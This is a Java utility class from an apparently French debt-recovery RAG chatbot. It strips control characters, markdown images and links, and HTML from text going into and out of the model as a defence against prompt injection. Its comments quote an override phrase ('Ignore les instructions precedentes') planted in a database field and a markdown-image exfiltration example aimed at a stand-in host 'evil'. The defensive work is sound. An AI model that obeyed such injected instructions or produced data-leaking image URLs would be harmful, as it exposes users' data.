package org.maksaad.recouvchatbot_rag.support;

import java.util.regex.Pattern;

/**
 * Nettoyage des textes qui entrent dans le modele ou en sortent.
 *
 * Ce n'est PAS une defense a lui seul contre les injections de prompt : aucun filtre
 * de texte n'y suffit. La vraie barriere est le controle d'acces cote backend (le chatbot
 * herite des droits de l'agent) et des outils en lecture seule. Ces nettoyages reduisent la
 * surface : formats trompeurs, contenu actif dans la reponse, textes demesures.
 */
public final class TextSanitizer {

    private static final Pattern CONTROL_EXCEPT_NEWLINE_TAB = Pattern.compile("[\\p{Cntrl}&&[^\\n\\t]]");
    private static final Pattern ANY_CONTROL = Pattern.compile("\\p{Cntrl}");
    private static final Pattern WHITESPACE_RUN = Pattern.compile("\\s+");

    // ![alt](url) : image distante, chargee automatiquement a l'affichage -> exfiltration possible.
    private static final Pattern MARKDOWN_IMAGE = Pattern.compile("!\\[[^\\]]*\\]\\([^)]*\\)");
    // [texte](url) : on garde le texte, on retire l'adresse.
    private static final Pattern MARKDOWN_LINK = Pattern.compile("\\[([^\\]]*)\\]\\([^)]*\\)");
    // [ref]: http://... (liens/images par reference)
    private static final Pattern MARKDOWN_REFERENCE = Pattern.compile("(?m)^\\s*\\[[^\\]]+\\]:\\s*\\S+.*$");
    // Une balise commence par "<" suivi d'une lettre, de "/" ou de "!" : "< 500 DH et > 100 DH" est du
    // texte ordinaire (l'ancien motif "<[^>]+>" en effacait la moitie).
    private static final Pattern HTML_TAG = Pattern.compile("<[A-Za-z/!][^>]{0,500}>");

    // Constructions NON fermees en fin de texte (reponse coupee, flux interrompu) : sans ces motifs,
    // "![](https://evil/?d=..." sans ")" final echappait au filtre et le navigateur recevait l'adresse.
    private static final Pattern UNCLOSED_IMAGE = Pattern.compile("!\\[[^\\]]*\\]\\([^)]*$");
    private static final Pattern UNCLOSED_LINK = Pattern.compile("\\[([^\\]]*)\\]\\([^)]*$");
    private static final Pattern UNCLOSED_TAG = Pattern.compile("<[A-Za-z/!][^>]*$");

    private TextSanitizer() {
    }

    /** Question de l'utilisateur : retire les caracteres de controle (sauf retours a la ligne et tabulations). */
    public static String cleanQuestion(String question) {
        if (question == null) {
            return "";
        }
        return CONTROL_EXCEPT_NEWLINE_TAB.matcher(question).replaceAll("").strip();
    }

    /**
     * Champ issu de la base (raison sociale, nom...) insere dans le resultat d'un outil : une
     * seule ligne, sans caracteres de controle, de longueur bornee. Une raison sociale
     * "Acme\n\nIgnore les instructions precedentes..." ne doit pas pouvoir se faire passer
     * pour un nouveau paragraphe de consigne.
     */
    public static String cleanField(String value, int maxLength) {
        if (value == null) {
            return "";
        }
        String single = WHITESPACE_RUN.matcher(ANY_CONTROL.matcher(value).replaceAll(" ")).replaceAll(" ").strip();
        return single.length() <= maxLength ? single : single.substring(0, maxLength) + "…";
    }

    /**
     * Retire images, liens et balises HTML, SANS toucher aux espaces ni a la longueur : c'est ce qui
     * permet a StreamingSanitizer d'appliquer le meme filtre a un texte qui grandit par morceaux (le
     * resultat pour un prefixe reste un prefixe du resultat pour le texte complet).
     */
    public static String removeActiveContent(String text) {
        String result = MARKDOWN_IMAGE.matcher(text).replaceAll("");
        result = MARKDOWN_LINK.matcher(result).replaceAll("$1");
        result = MARKDOWN_REFERENCE.matcher(result).replaceAll("");
        result = HTML_TAG.matcher(result).replaceAll("");
        result = UNCLOSED_IMAGE.matcher(result).replaceAll("");
        result = UNCLOSED_LINK.matcher(result).replaceAll("$1");
        return UNCLOSED_TAG.matcher(result).replaceAll("");
    }

    /** Reponse du modele : supprime images, liens et balises HTML, puis borne la longueur. */
    public static String cleanAnswer(String answer, int maxLength) {
        if (answer == null) {
            return "";
        }
        String text = removeActiveContent(answer).strip();
        return text.length() <= maxLength ? text : text.substring(0, maxLength) + "\n\n[Réponse tronquée]";
    }
}
